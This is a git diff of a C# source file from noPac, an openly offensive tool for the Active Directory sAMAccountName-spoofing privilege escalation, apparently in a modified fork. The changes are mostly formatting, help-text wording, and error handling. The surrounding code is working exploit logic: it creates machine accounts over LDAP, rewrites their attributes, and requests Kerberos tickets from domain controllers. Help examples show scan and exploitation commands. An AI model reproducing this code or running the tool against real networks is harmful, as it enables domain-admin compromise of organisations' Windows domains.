@@ -95,7 +95,6 @@ namespace noPac
                 }
             }
 
-
             // encryption types
             EncType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1; //default when no /ENCTYPE is specified
 
@@ -138,21 +137,17 @@ namespace noPac
                 {
                     if(string.IsNullOrEmpty(argDomain) || string.IsNullOrEmpty(argDomainUser) || string.IsNullOrEmpty(argDomainUserPassword))
                     {
-                        //Console.WriteLine("[-] /domain /user /pass argument needed for scanning");
                         PrintHelp();
                         return;
                     }
-
                     scan(argDomain, argDomainUser, argDomainUserPassword, domainUserPasswordHash, argDomainController, EncType);
                     return;
                 }
                 if (string.IsNullOrEmpty(argDomainController) || string.IsNullOrEmpty(argMachineAccount) || string.IsNullOrEmpty(argMachinePassword))
                 {
-                    //Console.WriteLine("[-] /dc /mAccount /mPassword argument needed for exploitation");
                     PrintHelp();
                     return;
                 }
-
                 argTargetSPN = $"{argService}/{argDomainController}";
                 if(String.IsNullOrEmpty(argDomain))
                     argDomain = String.Join(".", argDomainController.Split('.').Skip(1).ToArray());
@@ -206,8 +201,8 @@ namespace noPac
                 Console.WriteLine("Author @Cube0x0");
                 Console.WriteLine("Modified by Vibrio");
                 Console.WriteLine();
-                Console.WriteLine("/domain /user /pass argument needed for scanning");
-                Console.WriteLine("/dc /mAccount /nPassword argument needed for exploitation");
+                Console.WriteLine("/domain /user /pass arguments needed for scanning");
+                Console.WriteLine("/dc /mAccount /nPassword arguments needed for exploitation");
                 Console.WriteLine();
                 Console.WriteLine("Examples:");
                 Console.WriteLine("noPac.exe scan -domain htb.local -user domain_user -pass 'Password123!' /enctype aes128");
@@ -262,15 +257,12 @@ namespace noPac
                 case "ROOT":
                     container = "";
                     break;
-
             }
 
             if (string.IsNullOrEmpty(distinguishedName))
             {
-
                 if (!String.IsNullOrEmpty(container))
                 {
-
                     if (!String.IsNullOrEmpty(node))
                     {
                         distinguishedName = String.Concat("CN=", node, ",", container);
@@ -279,7 +271,6 @@ namespace noPac
                     {
                         distinguishedName = container;
                     }
-
                 }
 
                 domainComponent = domain.Split('.');
@@ -365,10 +356,8 @@ namespace noPac
                     Console.WriteLine("[+] Machine account {0} added", machineAccount);
                 }
 
-            }
-            catch (Exception ex)
+            } catch (Exception ex)
             {
-
                 if (ex.Message.Contains("The object exists."))
                 {
                     Console.WriteLine("[!] Machine account {0} already exists", machineAccount);
@@ -382,7 +371,6 @@ namespace noPac
                 connection.Dispose();
                 throw;
             }
-
         }
 
         public static void SetMachineAccountAttribute(string container, string distinguishedName, string domain, string domainController, string attribute, string machineAccount, string value, bool append, bool clear, bool verbose, NetworkCredential credential)
@@ -409,7 +397,6 @@ namespace noPac
 
             try
             {
-
                 if (append)
                 {
                     directoryEntry.Properties[attribute].Add(value);
@@ -428,25 +415,24 @@ namespace noPac
                     directoryEntry.CommitChanges();
                     Console.WriteLine("[+] Machine account {0} attribute {1} updated", machineAccount, attribute);
                 }
-
-            }
-            catch (Exception ex)
+            } catch (Exception ex)
             {
-                Console.WriteLine(ex.ToString());
-                throw;
+                Console.WriteLine("[!] Machine account modification failed. Check if you have the necessary privileges to perform this operation.");
+                //Console.WriteLine(ex.ToString());
+                //throw;
             }
 
             if (!String.IsNullOrEmpty(directoryEntry.Path))
             {
                 directoryEntry.Dispose();
             }
-
         }
 
         public static Dictionary<string, string> getDCs(string domain, string username, string password, string domainController)
         {
             Dictionary<string, string> list = new Dictionary<string, string>();
-            string endpoint = "";
+            String endpoint = "";
+
             if(string.IsNullOrEmpty(domainController))
             {
                 endpoint = domain;
@@ -468,21 +454,10 @@ namespace noPac
                     //Console.WriteLine("IPv4Address: " + entry.Properties["IPv4Address"].Value);
                     list.Add(entry.Properties["dnshostname"].Value.ToString(), "");
                 }
-            } catch {
-                Console.WriteLine("[!] LDAP bind to {0} failed. User {1} or its password is incorrect/locked/expired", domain, username);
-            }
-            return list;
-        }
-        
-        public static Dictionary<string, string> getDCs()
-        {
-            Dictionary<string, string> list = new Dictionary<string, string>();
-
-            Domain domain = Domain.GetCurrentDomain();
-
-            foreach (DomainController dc in domain.DomainControllers)
-            {
-                list.Add(dc.Name, dc.IPAddress);
+            } catch  (Exception ex) {
+                Console.WriteLine("[!] LDAP bind to {0} domain controller failed. Username {1} or its password is incorrect/locked/expired", domain, username);
+                //Console.WriteLine(ex.ToString());
+                //throw;
             }
             return list;
         }
@@ -491,7 +466,6 @@ namespace noPac
         {
             Dictionary<string, string> DCs = new Dictionary<string, string>();
             DCs = getDCs(domain, username, password, domainController);
-            //DCs = getDCs();
 
             foreach (var dc in DCs)
             {
@@ -508,7 +482,7 @@ namespace noPac
                         Console.WriteLine("[-] Could not get TGT from {0}", dc.Key);
                         continue;
                     }
-                }catch (Exception ex)
+                } catch (Exception ex)
                 {
                     Console.WriteLine("[-] Could not get TGT from {0}", dc.Key);
                     Console.WriteLine("[-] Exception {0}", ex);
